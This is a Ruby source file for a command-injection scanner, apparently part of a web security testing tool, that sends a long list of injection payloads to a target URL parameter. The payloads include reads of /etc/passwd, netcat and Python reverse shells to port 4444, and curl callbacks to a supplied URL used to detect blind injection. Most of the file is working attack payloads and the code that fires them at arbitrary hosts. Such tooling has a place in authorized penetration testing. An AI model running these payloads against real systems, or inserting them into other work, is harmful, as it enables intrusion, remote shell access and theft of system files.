require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class CommandInjection
  PAYLOADS = [
    '; ls',
    '| ls',
    '|| ls',
    '& ls',
    '&& ls',
    '`ls`',
    '$(ls)',
    '; id',
    '| id',
    '|| id',
    '& id',
    '&& id',
    '`id`',
    '$(id)',
    '; whoami',
    '| whoami',
    '|| whoami',
    '& whoami',
    '&& whoami',
    '`whoami`',
    '$(whoami)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '|| cat /etc/passwd',
    '& cat /etc/passwd',
    '&& cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)',
    '; ping -c 1 127.0.0.1',
    '| ping -c 1 127.0.0.1',
    '|| ping -c 1 127.0.0.1',
    '& ping -c 1 127.0.0.1',
    '&& ping -c 1 127.0.0.1',
    '`ping -c 1 127.0.0.1`',
    '$(ping -c 1 127.0.0.1)',
    '; sleep 5',
    '| sleep 5',
    '|| sleep 5',
    '& sleep 5',
    '&& sleep 5',
    '`sleep 5`',
    '$(sleep 5)',
    '; nc -e /bin/sh 127.0.0.1 4444',
    '| nc -e /bin/sh 127.0.0.1 4444',
    '|| nc -e /bin/sh 127.0.0.1 4444',
    '& nc -e /bin/sh 127.0.0.1 4444',
    '&& nc -e /bin/sh 127.0.0.1 4444',
    '`nc -e /bin/sh 127.0.0.1 4444`',
    '$(nc -e /bin/sh 127.0.0.1 4444)',
    '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
    '| python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
    '|| python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
    '& python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
    '&& python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
    '`python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"`',
    '$(python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])")'
  ]

  def self.test(url, parameter = 'cmd')
    vulnerable = false
    
    PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        start_time = Time.now
        response = Network.http_request(test_url)
        elapsed = Time.now - start_time
        
        if response
          if response.body.include?('uid=') || response.body.include?('gid=') || response.body.include?('root') || response.body.include?('bin/bash')
            puts Colorize.red("Command injection found!")
            puts Colorize.yellow("Payload: #{payload}")
            vulnerable = true
          elsif elapsed > 4 && payload.include?('sleep')
            puts Colorize.red("Time-based command injection!")
            puts Colorize.yellow("Payload: #{payload}")
            vulnerable = true
          end
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_blind(url, parameter = 'cmd', callback_url = nil)
    test_payloads = [
      '; ping -c 5 127.0.0.1',
      '| ping -c 5 127.0.0.1',
      '|| ping -c 5 127.0.0.1',
      '& ping -c 5 127.0.0.1',
      '&& ping -c 5 127.0.0.1',
      '`ping -c 5 127.0.0.1`',
      '$(ping -c 5 127.0.0.1)'
    ]
    
    if callback_url
      test_payloads << "; curl #{callback_url}"
      test_payloads << "| curl #{callback_url}"
      test_payloads << "|| curl #{callback_url}"
      test_payloads << "& curl #{callback_url}"
      test_payloads << "&& curl #{callback_url}"
      test_payloads << "`curl #{callback_url}`"
      test_payloads << "$(curl #{callback_url})"
    end
    
    vulnerable = false
    
    test_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        start_time = Time.now
        Network.http_request(test_url)
        elapsed = Time.now - start_time
        
        if elapsed > 4
          puts Colorize.red("Blind command injection detected!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_os_command(url, parameter = 'cmd')
    os_commands = {
      unix: ['id', 'whoami', 'uname -a', 'cat /etc/passwd', 'ls -la', 'pwd'],
      windows: ['whoami', 'ver', 'systeminfo', 'dir', 'type C:\\windows\\win.ini']
    }
    
    results = { unix: false, windows: false }
    
    os_commands.each do |os, commands|
      commands.each do |cmd|
        payload = "; #{cmd}"
        begin
          test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
          response = Network.http_request(test_url)
          
          if response
            if os == :unix && (response.body.include?('uid=') || response.body.include?('bin/bash') || response.body.include?('/etc/passwd'))
              puts Colorize.red("Unix command execution confirmed")
              results[:unix] = true
            elsif os == :windows && (response.body.include?('Windows') || response.body.include?('Microsoft') || response.body.include?('C:\\'))
              puts Colorize.red("Windows command execution confirmed")
              results[:windows] = true
            end
          end
        rescue => e
        end
      end
    end
    
    results
  end
end

